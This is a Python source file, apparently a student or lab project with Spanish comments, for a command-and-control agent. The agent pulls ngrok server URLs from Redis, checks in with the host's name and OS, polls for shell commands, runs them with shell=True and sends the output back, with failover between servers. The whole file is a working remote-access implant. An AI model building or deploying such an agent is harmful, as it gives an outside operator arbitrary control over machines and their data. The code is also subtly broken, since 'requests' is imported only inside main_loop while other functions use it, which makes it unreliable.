"""
Agente C2 - Máquina 5 (Agente)
Conecta a Redis para obtener lista dinámica de servidores
Se reconecta automáticamente si un servidor falla

INSTRUCCIONES:
1. Cambiar REDIS_HOST por tu IP real de máquina Redis
2. python3 agent_redis_para_5PCs.py
"""

import socket
import json
import time
import os
import subprocess
import sys
import threading

try:
    import redis
except ImportError:
    print("[!] ERROR: Se requiere redis")
    print("[*] pip install redis")
    sys.exit(1)

# ============================================
# CONFIGURACIÓN - CAMBIAR AQUÍ
# ============================================

REDIS_HOST = "192.168.1.100"      # 👈 CAMBIAR por IP DE MÁQUINA REDIS
REDIS_PORT = 6379
POLL_INTERVAL = 2                  # Segundos entre polls

# ============================================
# VARIABLES GLOBALES
# ============================================

agent_id = None
current_server_url = None
current_server_index = 0
servers_list = []
redis_client = None


def connect_to_redis():
    """Conecta a Redis."""
    global redis_client
    try:
        redis_client = redis.Redis(host=REDIS_HOST, port=REDIS_PORT, decode_responses=True, socket_connect_timeout=5)
        redis_client.ping()
        print(f"\n[✓] Conectado a Redis en {REDIS_HOST}:{REDIS_PORT}")
        return True
    except Exception as e:
        print(f"\n[!] Error conectando a Redis: {e}")
        return False


def get_servers_from_redis():
    """Obtiene lista de servidores de Redis."""
    global servers_list
    try:
        keys = redis_client.keys("server:*:ngrok_url")
        servers = []
        
        for key in keys:
            server_name = key.split(":")[1]
            url = redis_client.get(key)
            if url:
                servers.append((server_name, url))
        
        servers.sort()  # Orden consistente
        servers_list = servers
        
        if len(servers) > 0:
            print(f"\n[*] {len(servers)} servidores encontrados en Redis:")
            for i, (name, url) in enumerate(servers):
                print(f"    {i}: {name} -> {url}")
        else:
            print("\n[!] No hay servidores registrados en Redis")
        
        return len(servers) > 0
    except Exception as e:
        print(f"\n[!] Error consultando Redis: {e}")
        return False


def checkin_agent(server_url):
    """Agente se registra en un servidor."""
    global agent_id
    
    try:
        hostname = socket.gethostname()
        os_type = sys.platform
        
        payload = {
            "agent_id": agent_id,
            "hostname": hostname,
            "os": os_type
        }
        
        response = requests.post(f"{server_url}/checkin", json=payload, timeout=5)
        
        if response.status_code == 200:
            data = response.json()
            agent_id = data.get('agent_id', agent_id)
            print(f"\n[+] ✅ Conectado a {server_url}")
            print(f"    Agent ID: {agent_id}")
            return True
        else:
            print(f"\n[!] Error checkin: {response.status_code}")
            return False
    
    except Exception as e:
        print(f"\n[!] Error checkin: {e}")
        return False


def poll_commands(server_url):
    """Pregunta al servidor si hay comandos pendientes."""
    try:
        payload = {"agent_id": agent_id}
        response = requests.post(f"{server_url}/poll", json=payload, timeout=5)
        
        if response.status_code == 200:
            cmd = response.json()
            return cmd
        else:
            return None
    
    except Exception as e:
        return None


def execute_command(command):
    """Ejecuta comando en el OS."""
    try:
        if sys.platform == "win32":
            result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=30)
        else:
            result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=30)
        
        output = result.stdout + result.stderr
        return output
    
    except subprocess.TimeoutExpired:
        return "[TIMEOUT] Comando tardó más de 30 segundos"
    except Exception as e:
        return f"[ERROR] {str(e)}"


def send_result(server_url, msg_id, output):
    """Envía resultado al servidor."""
    try:
        payload = {
            "agent_id": agent_id,
            "id": msg_id,
            "output": output,
            "status": "ok"
        }
        
        response = requests.post(f"{server_url}/result", json=payload, timeout=5)
        return response.status_code == 200
    
    except Exception as e:
        print(f"[!] Error enviando resultado: {e}")
        return False


def failover_next_server():
    """Cambia al siguiente servidor."""
    global current_server_index, current_server_url
    
    if len(servers_list) == 0:
        print("[!] No hay servidores disponibles")
        return False
    
    current_server_index = (current_server_index + 1) % len(servers_list)
    server_name, server_url = servers_list[current_server_index]
    
    print(f"\n[!] Failover → {server_name}")
    
    if checkin_agent(server_url):
        current_server_url = server_url
        return True
    else:
        return False


def main_loop():
    """Loop principal del agente."""
    global agent_id, current_server_url, current_server_index
    
    import uuid
    import requests
    
    agent_id = f"agent-{str(uuid.uuid4())[:8]}"
    
    print("\n" + "=" * 60)
    print("  ALIGO C2 - AGENTE (5 Computadores)")
    print("=" * 60)
    print(f"[*] Redis: {REDIS_HOST}:{REDIS_PORT}")
    print(f"[*] Agent ID: {agent_id}")
    
    # Intentar conectar a Redis
    if not connect_to_redis():
        print("[!] Intentando reconectar en 5 segundos...")
        time.sleep(5)
        if not connect_to_redis():
            print("[!] No se puede conectar a Redis. Abortando.")
            sys.exit(1)
    
    # Obtener lista de servidores
    if not get_servers_from_redis():
        print("[!] No hay servidores. Esperando...")
        while not get_servers_from_redis():
            time.sleep(5)
    
    # Conectar al primer servidor
    if len(servers_list) > 0:
        server_name, server_url = servers_list[0]
        if not checkin_agent(server_url):
            print("[!] No se puede conectar al servidor. Intentando siguiente...")
            if not failover_next_server():
                print("[!] No se puede conectar a ningún servidor.")
                sys.exit(1)
        else:
            current_server_url = server_url
    
    print(f"\n[*] Iniciando loop de polling...")
    
    consecutive_failures = 0
    
    while True:
        try:
            time.sleep(POLL_INTERVAL)
            
            # Refrescar lista de servidores cada 60 segundos
            if int(time.time()) % 60 == 0:
                get_servers_from_redis()
            
            # Poll para comandos
            cmd_data = poll_commands(current_server_url)
            
            if cmd_data is None:
                consecutive_failures += 1
                
                if consecutive_failures >= 3:
                    print(f"\n[!] 3 fallos. Failover a siguiente servidor.")
                    if failover_next_server():
                        consecutive_failures = 0
                    else:
                        print("[!] Todos los servidores fallan. Reconectando...")
                        time.sleep(5)
                        consecutive_failures = 0
            else:
                consecutive_failures = 0
                
                if cmd_data.get('command') is not None:
                    command = cmd_data['command']
                    msg_id = cmd_data['id']
                    
                    print(f"\n[cmd recibido] id={msg_id}: {command}")
                    
                    output = execute_command(command)
                    
                    print(f"[ejecutando] {command}")
                    
                    if send_result(current_server_url, msg_id, output):
                        print(f"[resultado enviado] id={msg_id}")
        
        except KeyboardInterrupt:
            print("\n[*] Agente detenido")
            break
        except Exception as e:
            print(f"\n[!] Error: {e}")
            consecutive_failures += 1
            time.sleep(1)


if __name__ == "__main__":
    main_loop()

